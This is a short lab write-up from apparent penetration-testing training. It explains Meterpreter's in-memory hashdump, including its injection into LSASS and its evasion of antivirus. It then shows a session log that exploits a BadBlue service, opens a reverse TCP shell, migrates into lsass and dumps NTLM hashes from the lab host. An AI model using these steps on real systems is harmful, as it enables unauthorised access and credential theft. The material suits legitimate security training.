
The Metasploit Meterpreter has supported the `"hashdump" `command (through the Priv extension) since before version 3.0. The "hashdump" command is an in-memory version of the pwdump tool.

Instead of loading a DLL into LSASS.exe, it allocates memory inside the process, injects raw assembly code, executes its via CreateRemoteThread, and then reads the captured hashes back out of memory. 

This avoids writing files to the drive and by the same token avoids being flagged by antivirus (AV) and intrusion prevention (HIPS) products.

*********************************************************************************************************************************************

# Consider the same lab used for mimikatz, we exploit `Badblue` service to gain initial acess then migrate to `Lsass` process and start the meterpreter in-build mimikatz module `Kiwi`

msf6 exploit(windows/http/badblue_passthru) > `set RHOSTS 10.5.20.134`
RHOSTS => 10.5.20.134
msf6 exploit(windows/http/badblue_passthru) > `exploit`

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.5.20.134
[*] Meterpreter session 1 opened (10.10.26.2:4444 -> 10.5.20.134:49900) at 2023-12-26 14:07:46 +0530

meterpreter > `sysinfo`
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > `pgrep lsass`
588
meterpreter > `migrate 588`
[*] Migrating from 4904 to 588...
[*] Migration completed successfully.
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > `hashdump`
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
meterpreter > 

We can see the `LM Hash` - aad3b435b51404eeaad3b435b51404ee which is same for all users and `NTLM Hash` which is dddrent for each user